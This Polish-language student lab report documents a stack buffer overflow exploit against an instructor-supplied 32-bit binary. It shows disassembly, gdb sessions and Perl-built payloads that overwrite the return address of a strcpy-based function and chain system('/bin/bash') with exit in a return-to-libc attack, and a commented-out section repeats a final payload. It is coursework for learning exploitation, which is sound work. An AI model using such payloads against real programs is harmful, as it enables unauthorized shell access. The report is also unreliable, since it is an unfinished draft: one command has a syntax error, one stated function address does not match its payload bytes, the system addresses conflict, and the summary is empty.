# Exploit



## Spis treści
1. [Cel](#cel)
2. [Wymagania systemowe](#wymagania-systemowe)
3. [Hello world](#hello-world)
4. [Program 55](#program-55)
5. [Exploit](#exploit)
6. [Podsumowanie](#podsumowanie)



## Cel
Na laboratorium została odświeżona wiedza z kursu Architektura Komputerów 2, w szczególności z zakresu języka assemblera na platformie Linux/x86 ([GAS Syntax](https://en.wikibooks.org/wiki/X86_Assembly/GAS_Syntax)).

W ramach przypomnienia pierwszym zadaniem był program typu "hello world" w języku C. Główna część laboratorium to napisanie ataku typu [exploit](https://en.wikipedia.org/wiki/Exploit_(computer_security)) dokonanego na programie [55](./src/55) dostarczonym przez prowadzącego.

Celem było przejęcie kontroli nad wykonaniem programu i zakończenie go sukcesem.



## Wymagania systemowe
W celu odtworzenia środowiska uruchomieniowego konieczne jest wyłącznie oprogramowanie [Docker](https://www.docker.com).

Uruchomienie skryptu:
```bash
$ ./run.sh
```
powoduje zbudowanie obrazu, a następnie kontenera. Obraz bazowy zawiera w sobie system [Ubuntu 14.04](https://hub.docker.com/_/ubuntu) razem z programi potrzebnymi do pracy z językiem assemblera. Ponadto obraz rozszerzono w pliku [Dockerfile](./src/Dockerfile) o biblioteki dla języka C w wersji 32-bitowej.

Domyślnym katalogiem roboczym w kontenerze jest `/workspace`, do którego kopiowana jest cała zawartość folderu [./src](./src)

Po zakończeniu pracy, kontener oraz obraz można usunąć skryptem:
```bash
$ ./clear.sh
```



## Hello world
Prosty program wypisujący napis "Hello world!" na konsoli został napisany w pliku [hello.c](./src/hello.c), a następnie skompilowany skryptem [compile.sh](./src/compile.sh).

Jego plik wykonywalny został potraktowany przez komendę powodującą deasemblację, w której interesującym fragmentem jest wywołani funkcji main:
```
000000000040052d <main>:
  40052d: 55                    push   %rbp
  40052e: 48 89 e5              mov    %rsp,%rbp
  400531: bf d4 05 40 00        mov    $0x4005d4,%edi
  400536: e8 d5 fe ff ff        callq  400410 <puts@plt>
  40053b: b8 00 00 00 00        mov    $0x0,%eax
  400540: 5d                    pop    %rbp
  400541: c3                    retq
  400542: 66 2e 0f 1f 84 00 00  nopw   %cs:0x0(%rax,%rax,1)
  400549: 00 00 00
  40054c: 0f 1f 40 00           nopl   0x0(%rax)
```

Wykorzystana komenda:
```bash
$ objdump -D hello
```

W ramach przypomnienia znaczenia i wybranych działania dyrektyw:
- funkcja `leave` niszczy ramkę stosu,
- `ret` zdejmuje ze stosu pierwszą wartość i skacze,
- `lea` = load effective address,
- parametry na stos wrzucane są w odwrotnej kolejności,



## Program [55](./src/55)
Przed rozpoczęciem jakichkolwiek działań, należało nadać uprawnienia do wykonywania pliku:
```bash
$ chmod +x 55
```

Sam plik jest wykonywalnym plikiem little-endian:
```bash
$ file 55
55: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=2c7960701eba7acdbc290a0417bb45dbe565cb52, not stripped
```

Jego zawartość została zdesasemblowana w takim sam sposób jak `hello`.

W funkcji `main` jest dany fragment:
```
8048615:  83 7d 08 02           cmpl   $0x2,0x8(%ebp)
8048619:  74 13                 je     804862e <main+0x22>
8048627:  b8 01 00 00 00        mov    $0x1,%eax
804862c:  c9                    leave
804862d:  c3                    ret
```
co oznacza, że jeśli podany jest drugi arugment przy wykonaniu pliku (pierwszym argumentem jest nazwa pliku), to program skacze w inne miejsce (adres `804862e`) – instrukcja `if`.


W dalszych operacjach po spełnieniu instrukcji warunkowej jest m.in. wywołanie funkcji `validate`:
```
8048655:  e8 4a ff ff ff        call   80485a4 <validate>
```

`validate` przyjmuje argument do rejestru EAX i zwraca w nim 0 (_integer_) informując o błędnej walidacji.

Cała funkcja:
```
080485a4 <validate>:
 80485a4: 55                    push   %ebp
 80485a5: 89 e5                 mov    %esp,%ebp
 80485a7: 83 ec 58              sub    $0x58,%esp
 80485aa: 8b 45 08              mov    0x8(%ebp),%eax
 80485ad: 89 44 24 04           mov    %eax,0x4(%esp)
 80485b1: 8d 45 c1              lea    -0x3f(%ebp),%eax
 80485b4: 89 04 24              mov    %eax,(%esp)
 80485b7: e8 d8 fe ff ff        call   8048494 <strcpy@plt>
 80485bc: b8 00 00 00 00        mov    $0x0,%eax
 80485c1: c9                    leave
 80485c2: c3                    ret
```

Linia `sub    $0x58,%esp` oznacza zarezerowanie na stosie miejsca dla 0x58 (0d88) bajtów. Jest to miejsce na przechowywanie zmiennych lokalnych.


Następnie adres argumentu podany przy wywołaniu funkcji `main` zalokowany na stosie, nad adresem powrotu, zostaje skopiowany pod adres ebp-0x54.

| Adres  | Stos                       |
|--------|----------------------------|
| ebp+8  | parametr funkcji           |
| ebp+4  | adres powrotu              |
| ebp    | $EBP                       |
| ebp-4  | zmienne lokalne (koniec)   |
| ...    | ...                        |
| ebp-63 | $EAX                       | 
| ...    | ...                        |
| ebp-84 | ...                        |
| ...    | ...                        |
| ebp-88 / esp | zmienne lokalne (początek) |


Argument podany przy wywłaniu programu ostatecznie trafia w miejsce oznaczone powyżej adresem z pamięci `ebp-63`, co tworzy bufor o wielkości 0x37 (0d63) bajtów.

Następnie wywołana jest funkcja systemowa `strcpy` służąca do kopiowania ciągu znaków spod jednego adresu, w inny.
Funkcja powinna być używana w nastepujący sposób: `strcpy(destination, source)`. Dodatkowo, kopiowany string powinien być zakończony bajtem zerowym.


-------------------------

Przy przekazaniu argumentu do wykonania programu, w zależności od jego długości można osiągnąć dwa rezultaty:

1. Zwykła informacja o błędnym tokenie – argument o długości 66.
```bash
$ ./55 111111111111111111111111111111111111111111111111111111111111111111
To continue you must provide security access token (21 digits)
The access token you provided is invalid. Good bye.
Finished
```

2. Segmentation fault – argument o długości 67.
```bash
root@159dbf638a64:/workspace# ./55 1111111111111111111111111111111111111111111111111111111111111111111
To continue you must provide security access token (21 digits)
111111111111111111111111111111111111111111111111111111
Segmentation fault
```

Drugi z wyników jest efektem nadpisania części programu poprzez wyjście poza przestrzeń adresową przeznaczoną na zmienne.



## Exploit
Napisanie exploita, po uprzedniej analizie pliku, wiąże się z przekazaniem na stos takich parametrów, które pozwolą nam na manipulację działania programu, w momencie wywołania programu.

Atak opiera się na podaniu argumentu o długości przekraczającej wielkość bufora, nadpisaniu adresu powrotu funkcji `validate`, a potem przestrzeni adresowej z parametrami. Daje to możliwość manipulacji z jakimi parametrami zostaną wykonane kolejne funkcje.

Do osiągnięcia celu zostały podjęte kolejne kroki:

1. Nadpisanie adresu powrotu adresem funkcji `destroy_world`.

   Wykorzystano język [Perl](https://en.wikipedia.org/wiki/Perl). Podczas wywołania debuggera należało dokleić kawałek kodu:
    ```bash
    gdb --args 55 `perl -e'print "1"x67 "\xd0\x87\x04\x08"'`
    ```

   Podawane jest 67 jedynek, a następnie adres funkcji `destroy world` (0x080485d7) zapisany bajtami zaczynając od najmniej znaczących (konwencja little-endian).

   **Rezultat**:
   ```
   (gdb) r
  Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111ׅ
  warning: Error disabling address space randomization: Operation not permitted
  To continue you must provide security access token (21 digits)
  BAM!
  /bin/bash
  During startup program terminated with signal SIGSEGV, Segmentation fault.
   ```

   Osadzenie adresu spowodowało wykonanie funkcji, która wypisała na konsolę "BAM!" oraz "/bin/bash".

2. Wywołanie funkcji `system` i shella bashowego.
   
   Funkcja `system(string)` przyjmuje komendę jako argument. 
   Ale najpierw trzeba odnaleźć miejsce w pamięci wskazujące na string z komendą tj. ścieżka do shella.

   Potrzebne są:
   - Adres tesktu `/bin/bash`.
      Debuggując program, można go znaleźć w funkcji `validate`, bo jest tam wyświetlany:
      
      `p system`
      0xf7e3cda0
      
      `p/x bash`
      0x080487d0

      Budowa shellcode'u:
      - 67 jedynek
      - 4 bajty adresu funkcji `system`
      <!-- - 4 dowolne bajty (nadpisanie adresu powrotu) / cokolwiek -->
      - 4 bajty adresu tesktu "bin/bash"
      - 4 bajty adresu funkcji exit
      - 4 bajty zerowe (exit)

      ```bash
      gdb --args 55 `perl -e'print "1"x67 . "\xd7\x85\x04\x08" . "\x75\x44\x44\x44" . "\xa0\xcd\xe3\xf7" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
      ```

   - Adres funkcji `system`.
   
      Szukamy adresu funkcji exit: `080484d4`

      system
      adres exit
      bin/bash



## Podsumowanie


------------------

<!-- Lab4

na początku jest zmienna lokalna duża
wywołanie: strcpy(ta zmienna lokalna, argument funkcji validate)

Debuggujemy funkcję dla 67 jedynek
```
gdb --args 55 `perl -e'print "1"x67'`
disass validate # disassemble 
b *0x080485c2 # ustawia breakpoint pod adresem ret w funkcji validate
r
```

na samej górze adres powrotu
```
p/x 8
# chcemy wyświetlić to co jest na stosie
p/x $esp
x/8x $esp # wyświetli 8 różnych wartości (8 słów w hexie, 8 rzędów po 4)
# x = examine memory
```

Debuggujemy funkcję dla 66 jedynek
```
gdb --args 55 `perl -e'print "1"x66'`
disass validate # disassemble 
b *0x080485c2 # ustawia breakpoint pod adresem ret w funkcji validate
r
x/8x $esp
```

Funkcja wraca pod adres `804865a` (adres powrotu po wywołanie `ret`).

podając argument 67, odpalany jest argument 68

podać liczbę dłuższą o 3 bajty np. 70, żeby na końcu były 3 jedynki

313131


### Sprawko

Obrazowanie stosu miło widziane
krok po kroku co się dzieje

możnaby podać parametr do funkcji exit

uwaga: bajt zerowy kończy string




system: 08048454
bash: 0804a030
exit: 080484d4

./55 `perl -e'print "1"x67 . "\xd7\x85\x04\x08" . "\xd0\x87\x04\x08" . "\xd4\x84\x04\x08" . "\x0\x0\x0\x0"'`


-->
